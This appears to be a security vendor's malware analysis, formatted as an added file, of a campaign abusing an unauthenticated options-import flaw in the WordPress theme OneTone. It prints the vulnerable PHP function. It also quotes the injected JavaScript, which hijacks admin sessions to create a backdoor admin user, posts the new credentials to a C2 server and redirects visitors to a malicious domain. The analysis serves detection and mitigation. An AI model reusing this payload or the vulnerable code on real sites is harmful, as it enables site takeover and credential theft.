@@ -1,0 +1,100 @@
+OneTone Vulnerability Leads to JavaScript Cookie Hijacking
+
+A vulnerability in the discontinued WordPress theme OneTone has been added to an ongoing campaign that is targeting vulnerable WordPress websites and causes malicious redirects through domains like ischeck[.]xyz.
+This specific wave uses the XSS vulnerability to inject malicious JavaScript and redirect visitors to the attacker’s landing page. The malware also detects and leverages existing admin user sessions to create a new admin user for later use as a backdoor.
+Unauthenticated Changes in Theme Configuration Files
+The vulnerability lies within OneTone’s  ./wp-content/themes/onetone/includes/theme-functions.php file:
+function onetone_options_import(){
+$option_name = onetone_option_name();
+if(isset($_POST['options'])){
+$options = stripslashes($_POST['options']);
+$new_options = json_decode($options, true);
+
+if(is_array($new_options) && $new_options != NULL ){
+
+update_option($option_name,$new_options);
+_e( 'Import successful.', 'onetone');
+exit(0);
+}
+}
+_e( 'Import failed.', 'onetone');
+exit(0);
+}
+
+This JavaScript allows the attacker to perform unauthenticated changes to the theme’s configuration, allowing them to inject JavaScript into the website’s WordPress database onetone value within the wp_options table. This value is responsible for loading the theme’s configuration and is loaded on every page visit so that the theme knows how to display the page.
+Database Entries Used in Injections
+So, what is loaded from the database entry that is injected with the attacker’s JavaScript?
+
+The beginning of this entry with its serialized data may appear to be normal at first glance — these are the values used by the vulnerable theme for its configuration. However, a closer inspection reveals the malicious JavaScript injected at the end of the entry within the <script> tags. The injection’s payload is encoded with base64 — therefore, JavaScript needs to decode it with the function atob( before running it through eval(. The end result is the malicious JavaScript which is loaded by visitors who navigate to the infected website.
+Cookie Behavior
+The decoded JavaScript works by defining multiple functions like setCookie and getCookie that will be used for reading and setting a visitor’s cookies on the infected website.
+function setCookie(name, value, days) {
+var expires = "";
+if (days) {
+var date = new Date();
+date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+expires = "; expires=" + date.toUTCString();
+}
+document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
+
+function getCookie(name) {
+var nameEQ = name + "=";
+var ca = document.cookie.split(";");
+for (var i = 0; i < ca.length; i++) {
+var c = ca[i];
+while (c.charAt(0) == " ") c = c.substring(1, c.length);
+if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+}
+return null;
+}
+...
+
+One of the other defined functions is isAdmin, which is used to determine if the visitor is currently logged into wp-admin. It accomplishes this by checking whether or not the HTML element wp-admin-bar-customize is being loaded. This element is the “admin bar” displayed at the top of a WordPress website when a user is logged into the WordPress dashboard:
+
+The isAdmin function also checks to see if the file /wp-admin/user-new.php is being loaded or not. This is the WordPress file used for creating new users in wp-admin and it doesn’t load unless the visitor is already a user logged into the WordPress dashboard:
+function isAdmin() {
+return !!document.getElementById('wp-admin-bar-customize')
+|| document.documentElement.innerHTML.includes("user" + "-new.php");
+}
+
+The injected JavaScript’s main function uses all of the previously defined functions to perform the following actions:
+
+Checks whether the visitor is logged into wp-admin using the isAdmin function.
+
+Checks for the value of the Tho3faeK cookie using the getCookie function defined by the attacker.
+
+Assigns values for the URL parameters for the /wp-admin/user-new.php file, which are required to create a new admin user through the file /wp-admin/user-new.php
+Submits a POST request to /wp-admin/user-new.php to create a new malicious admin user named system.
+
+if (req.responseURL.includes("update=add")) {
+var info = baseDir + ";;;" + username + ";;;" + password;
+var gateUrl = "hxxp://193.37.214[.]20:28513/inpsdsd2";
+request(gateUrl, "POST", "s=" + encodeURIComponent(info), true);
+}
+};
+
+setCookie("Tho3faeK", "do", 365);
+}
+}else{
+
+Checks the web server’s response URL to make sure it contains update=add. When this value is present, it indicates a new user was successfully created with the attacker’s POST request
+Creates the info variable containing the newly created admin user and the infected website’s URL, then submits it to a C2 server for collection.
+Uses the function setCookie to create a cookie named Tho3faeK with the value do and a validity of 365 days.
+
+Backdoors & Visitor Redirects
+This theme vulnerability allows attackers to only inject HTML to certain places on the web page. To improve their chances of maintaining unauthorized access to the site, attackers use this vulnerability to inject Javascript through HTML’s <script> tags and hijack authenticated administrator sessions. When successful, the hijacked session can then be used to create a malicious admin user that exists as a backdoor to the infected website. This maliciously created admin user can also be used to add additional backdoors like PHP shells through the WordPress dashboard.
+Planting a variety of backdoors ensures the success of the campaign — in the event that the vulnerability is patched or the JavaScript injection is removed, the attackers will still be able to access the compromised environment.
+Finally, all of the website and created user information is sent to a C2 server where the attacker can automate the collection of the new admin users from across many infected websites.
+Since most website visitors will not be logged in as a wp-admin user, the last part of the malicious JavaScript is used to redirect those visitors elsewhere. It accomplishes this by checking if the value of the ppkcookie cookie equals un — if it doesn’t, the visitor is instead sent to the malicious redirector ischeck[.]xyz.
+var x = getCookie("ppkcookie");
+if (x !== "un") {
+if (isDesktop() || isMobile()) {
+setCookie("ppkcookie", "un", 30);
+window.location.replace("hxxps://ischeck[.]xyz/?onetone");
+}
+}
+
+Conclusion & Mitigation Steps
+Backdoors are a common component of most malware campaigns, as they allow attackers to establish and maintain unauthorized access long after the initial infection. The admin user created by this malware injection clearly demonstrates how an attacker can leverage JavaScript alongside vulnerabilities within popular components to gain — and preserve — unauthorized access to a website.
+Since this malicious JavaScript malware is loaded on a website’s pages, it can be detected through services which scan the website externally like SiteCheck unlike PHP admin user malware, which usually isn’t externally detectable on the website. Website owners are better off using a server-side scanning tool for more thorough environment checks, since both JavaScript and PHP admin user malware can be detected with this method. A server-side scanner can help you detect a variety of different malware, including backdoors, phishing pages, spam, and DDoS scripts.
